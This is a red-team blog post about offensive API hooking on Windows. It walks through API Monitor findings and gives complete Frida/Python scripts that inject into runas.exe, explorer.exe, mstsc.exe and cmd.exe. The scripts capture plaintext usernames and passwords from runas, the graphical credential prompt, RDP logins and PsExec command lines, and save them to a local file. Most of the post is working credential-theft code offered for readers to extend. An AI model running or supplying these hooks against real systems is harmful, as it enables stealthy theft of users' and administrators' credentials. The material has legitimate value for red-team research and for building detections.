---
title: Offensive API Hooking
author: Ilan Kalendarov
date: 2021-02-11 14:10:00 +0800
categories: [Red Team]
tags: [persistence, av evasion]

---

## Introduction

------

Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious API calls. In this blog post, we'll explore API hooking but from the offensive point of view. We'll use API Monitor to investigate which API calls used by each program then, using Frida and python to build our final hooking script. This post is inspired by the Red Teaming Experiments [blog post.](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida )



## API Monitor

------

Api Monitor is a great tool for... you guessed it, monitoring api calls. You can find it [here](http://www.rohitab.com/downloads).

Firing up Api Monitor this will be the main screen:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/ApiMonitorHomeScreen.png)

As you can see I've chosen all library options therefore, I would able to catch most of the API possibilities. Let's start by monitoring a new process, I'll choose `runas.exe` first.

According to Microsoft docs:

> It allows a user to run specific tools and programs with different permissions than the user's current logon provides.

Looks good to me as a start. 

Opening runas and trying to login as a different user gives us the above API call:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasAPICall.png)

Great so we know that the `CreateProcessWithLogonW` api call contains our secret password. Looking at the [microsoft docs ](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) we could see that the first and third arguments will store the username and password. Now that we have that information let's build our script!.



## Frida

------

According to Frida's site:

> It’s [Greasemonkey](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/) for native apps, or, put in more technical terms, it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.

We'll be able to build a JavaScript snippet that takes the function name from the DLL library - `Advapi.dll`. The script should look like this:

```javascript
var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from the dll library

Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
	onEnter: function (args) {
		this.lpUsername = args[0];
		this.lpDomain = args[1];
		this.lpPassword = args[2];
		this.lpCommandLine = args[5];
	},
	onLeave: function (args) { // getting the plain text credentials 
		send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");

	}
});
```

Now, all left to do is to insert the JavaScript snippet into a python script, The final python script should look like this:

```python
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread

# Locking the runas thread to prevent other threads
#interfering with our current session
lockRunas = Lock()  

def on_message_runas(message, data):
	# Executes when the user enters the password.
	# Then, open the txt file and append the data.
	print(message)
	if message['type'] == "send":
		with open("Creds.txt", "a") as f:
			f.write(message["payload"] + '\n')
		try:
			lockRunas.release()
			print("[+] released")
		except Exception:
			pass


def WaitForRunAs():
	while True:
		# Trying to find if runas is running if so, execute the "RunAs" function.
		if ("runas.exe" in (p.name() for p in psutil.process_iter())) and not lockRunas.locked():
			lockRunas.acquire() # Locking the runas thread
			print("[+] Found RunAs")
			RunAs()
			sleep(0.5)

		# If the user regret and they "ctrl+c" from runas then release the thread lock and start over.
		elif (not "runas.exe" in (p.name() for p in psutil.process_iter())) and lockRunas.locked():
			lockRunas.release()
			print("[+] Runas is dead releasing lock")
		else:
			pass
		sleep(0.5)

def RunAs():
	try:
		# Attaching to the runas process
		print("[+] Trying To Attach To Runas")
		session = frida.attach("runas.exe")
		print("[+] Attached runas!")

		# Executing the following javascript
		# We Listen to the CreateProcessWithLogonW func from Advapi32.dll to catch the username,password,domain and the executing program 		  in plain text.
		script = session.create_script("""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from 		the dll library
		Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
			onEnter: function (args) {
				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) { // getting the plain text credentials 
				send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");

			}
		});

		""")

		# If we got a hit then execute the "on_message_runas" function
		script.on('message', on_message_runas)
		script.load()
	except Exception as e:
		print(str(e))

if __name__ == "__main__":
	thread = Thread(target=WaitForRunAs)
	thread.start()
```

Great! lets try to run the script:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasScript.png)



## Credentials Prompt  (A.K.A Graphical Runas)

------

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/GraphicalRunas.png)

   

At this point, it's pretty easy, Implementing the steps as we did with the CLI version of runas. Let's fire up API Monitor. Using the process locator option in API Monitor we could see that the process is `explorer.exe`:

 ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/processLocator.png)

Using the steps like we did before I was able to find that the function `CredUnPackAuthenticationBufferW` from `Credui.dll` was called.

According to Microsoft docs:

>  The CredUnPackAuthenticationBuffer function converts an authentication buffer returned by a call to the [CredUIPromptForWindowsCredentials](https://docs.microsoft.com/en-us/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa) function into a string user name and password.

All left to do is to write our JavaScript and python scripts, Final script should look like this:

```python
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

def on_message_credui(message, data):
	# Executes when the user enters the credentials inside the Graphical runas prompt.
	# Then, open a txt file and appends the data.
	print(message)
	if message['type'] == "send":
		with open("Creds.txt", "a") as f:
			f.write(message["payload"] + '\n')


def CredUI():
	# Explorer is always running so no while loop is needed.

	# Attaching to the explorer process
	session = frida.attach("explorer.exe")

	# Executing the following javascript
	# We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
	script = session.create_script("""

	var username;
	var password;
	var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

	Interceptor.attach(CredUnPackAuthenticationBufferW, {
		onEnter: function (args) 
		{

			username = args[3];
			password = args[7];
		},
		onLeave: function (result)
		{
		   
			var user = username.readUtf16String()
			var pass = password.readUtf16String()

			if (user && pass)
			{
				send("\\n+ Intercepted CredUI Credentials\\n" + user + ":" + pass)
			}
		}
	});

	""")
	# If we found the user and pass then execute "on_message_credui" function
	script.on('message', on_message_credui)
	script.load()
	sys.stdin.read()
    
if __name__ == "__main__":
	CredUI()
```



## RDP 

------

Reading the MDSec [blog post](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/) and Red Teaming Experiments [blog](https://www.ired.team/offensive-security/code-injection-process-injection/api-monitoring-and-hooking-for-offensive-tooling) I thought to myself, there's must be a simple way to hook RDP credentials.

Looking at the Graphical Runas prompt and the RDP login prompt they look alike:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/rdpvsRunas.png)

What if they use the same API call? Let's try:

Using the same script from the Credentials Prompt we were able to get the RDP credentials !!

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/FridaRdpTest.png)

All left to do is to write the final python script, It should look like that:

```python
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

# Locking the mstsc thread to prevent other threads
#interfering with our current session
lockRDP= Lock()  

def on_message_rdp(message, data):
	# Executes when the user enters the password.
	# Then, open the txt file and append the data.
	print(message)
	if message['type'] == "send":
		with open("Creds.txt", "a") as f:
			f.write(message["payload"] + '\n')
		try:
			lockRDP.release()
			print("[+] released")
		except Exception:
			pass


def WaitForRDP():
	while True:
		# Trying to find if mstsc is running if so, execute the "RunAs" function.
		if ("mstsc.exe" in (p.name() for p in psutil.process_iter())) and not lockRDP.locked():
			lockRDP.acquire() # Locking the mstsc thread
			print("[+] Found RunAs")
			RDP()
			sleep(0.5)

		# If the user regret and they close mstsc then we will release the thread lock and start over.
		elif (not "mstsc.exe" in (p.name() for p in psutil.process_iter())) and lockRDP.locked():
			lockRDP.release()
			print("[+] RDP is dead releasing lock")
		else:
			pass
		sleep(0.5)

def RDP():
	try:
		# Attaching to the mstsc process
		print("[+] Trying To Attach To RDP")
		session = frida.attach("mstsc.exe")
		print("[+] Attached to mstsc!")

		# Executing the following javascript
		# We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the username,password,domain and the executing 		program in plain text.
		script = session.create_script("""

		var username;
		var password;
		var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

		Interceptor.attach(CredUnPackAuthenticationBufferW, {
			onEnter: function (args) 
			{

				username = args[3];
				password = args[7];
			},
			onLeave: function (result)
			{
			   
				var user = username.readUtf16String()
				var pass = password.readUtf16String()

				if (user && pass)
				{
					send("\\n+ Intercepted RDP Credentials\\n" + user + ":" + pass)
				}
			}
		});

		""")
		# If we got a hit then execute the "on_message_rdp" function
		script.on('message', on_message_rdp)
		script.load()
	except Exception as e:
		print(str(e))

if __name__ == "__main__":
	thread = Thread(target=WaitForRDP)
	thread.start()
```

Executing the script will get us the creds:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RdpCreds.png)



## PsExec

------

Last but not least, PsExec - the great remoting tool from the sysinternals suite, This was interesting to research. Let's open API Monitor and load PsExec with the right arguments, The result is:

 ![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/PsExecResukt.png)

`WNetAddConnection2W` is the function that contains our secret password. If we'll try to implement this we'll run into a problem, Frida won't have time to attach to the `PsExec.exe` process because we are giving the password as an argument, Let's try it: 

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/PSEXECerror.png)

The script was not fast enough to catch the credentials we need to find a different way. Looking at this I thought to myself, what if we hook everything that was entered inside the command prompt? Let's find out. This time I'll try to monitor the command prompt and check for our secret password:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/CmdExplore.png)

We can see there is a new thread under, Searching for our password resulted in the `RtlInitUnicodeStringEx` function from `Ntdll.dll`. unfortunately, there are no docs available at Microsoft like most of the Ntdll library. But we can see the arguments that the function takes. The second argument - `SourceString` looks interesting as it contains the whole command, We also can see that the function is used **a lot** of times, Basically every time the user gives input to the command prompt, So we need to build a filter mechanism in order to filter unwanted garbage.

Final script should look like this:

```python
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread
import sys

# Locking the cmd thread to prevent other threads
#interfering with our current session
lockCmd = Lock()

def on_message_cmd(message, data):
	# Executes when the user enters the right keyword from the array above.
	# Then, open the txt file and append it

	#filter the wanted args
	arr = ["-p", "pass", "password"]
	if any(name for name in arr if name in message['payload']):
		print(message['payload'])
		with open("Creds.txt", "a") as f:
			f.write(message['payload'] + '\n')
		try:
			lockCmd.release()
			print("[+] released")
		except Exception:
			pass


def WaitForCmd():
	numOfCmd = []
	while True:
		#  Trying to find if cmd is running if so, execute the "CMD" function.
		if ("cmd.exe" in (p.name() for p in psutil.process_iter())):
			process = filter(lambda p: p.name() == "cmd.exe", psutil.process_iter())
			for i in process:
				# if we alredy hooked the cmd window,pass
				if (i.pid not in numOfCmd):
					#IF a new cmd window pops add it to the array, we want to hook
					#evey cmd window
					numOfCmd.append(i.pid)
					lockCmd.acquire()
					print("[+] Found cmd")
					Cmd(i.pid)
					lockCmd.release()
					sleep(0.5)

		# if cmd is dead release the lock
		elif (not "cmd.exe" in (p.name() for p in psutil.process_iter())) and lockCmd.locked():
			lockCmd.release()
			print("[+] cmd is dead releasing lock")
		else:
			pass
		sleep(0.5)

def Cmd(Cmdpid):
	try:
		# attaching to the cmd window, this time with the right pid
		print("[+] Trying To Attach To cmd")
		session = frida.attach(Cmdpid)
		print("[+] Attached cmd with pid {}!".format(Cmdpid))
		script = session.create_script("""
			var username;
			var password;
			var CredUnPackAuthenticationBufferW = Module.findExportByName("Ntdll.dll", "RtlInitUnicodeStringEx")			
			Interceptor.attach(CredUnPackAuthenticationBufferW, {
				onEnter: function (args) 
				{
					password = args[1];
				},
				onLeave: function (result)
				{
					// Credentials are now decrypted
					var pass = password.readUtf16String();
			
					if (pass)
					{
						send("\\n+ Intercepted cmd Creds\\n" + ":" + pass);
					}
				}
			});

		""")
		script.on('message', on_message_cmd)
		script.load()
	except Exception as e:
		print(str(e))

if __name__ == "__main__":
	thread = Thread(target=WaitForCmd)
	thread.start()
```

The result would be:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/cmdResukt.png)

Great! we were able to intercept the credentials.



## Conclusion 

This was my first blog, hopefully, many more to come. I've learned a lot researching this topic. You can expand the scripts to your personal needs or even combine all of them together, I'll leave it for you to explore ;). 

Feedback and additions or corrections are strongly encouraged. You can reach me via the above channels.



## Links & Resources

* Instrumeting Windows APIs With Frida - <https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida>
* RdpThief - <https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/>
* Frida <https://frida.re/>
* Api Monitor - <http://www.rohitab.com/apimonitor>

